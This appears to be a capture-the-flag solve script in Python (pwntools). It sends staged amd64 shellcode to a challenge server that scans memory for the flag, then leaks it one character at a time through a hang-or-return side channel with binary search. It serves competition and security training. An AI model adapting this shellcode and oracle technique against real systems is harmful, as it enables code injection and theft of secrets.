from pwn import *


context.arch = "amd64"

stage1 = asm("""
            mov rsi, rdx
            mov rdx, 100
            xor rdi, rdi
            xor rax, rax
            syscall
            ret
            """).ljust(32, b"\x90")

pre_stage2 = b"\x90" * 26 + asm(f"""
            xor rdi, rdi
            xor rsi, rsi
            mov rdx, 1
            cmp rsi, 0x0
            _search_flag:
            add rsi, 0x1000
            xor rax, rax
            syscall
            cmp rax, 1
            jne _search_flag
            cmp byte ptr [rsi], 'i'
            jne _search_flag
            """)


post_stage2 = asm("""
            jle _loop
            ret
            _loop:
            jmp _loop
            """) + b"i" * 0xFF


def pwn(shellcode):
    r = remote("ictf.maple3142.net", 1234)
    # r = process("./chall")
    r.send(shellcode)
    try:
        r.recv(timeout=0.5)
        r.close()
        return True
    except:
        r.close()
        return False


def build_shellcode(offset, char):
    shellcode = stage1 + pre_stage2 + asm(f"cmp byte ptr [rsi + {offset}], '{char}'") + post_stage2
    return shellcode


flag = "ic"
while not flag.endswith("}"):
    l, r = 31, 127
    while l < r:
        print(l, r)
        m = (l + r) // 2
        shellcode = build_shellcode(len(flag), chr(m))
        if pwn(shellcode):
            r = m
        else:
            l = m + 1
    flag += chr(l)
    print(flag)
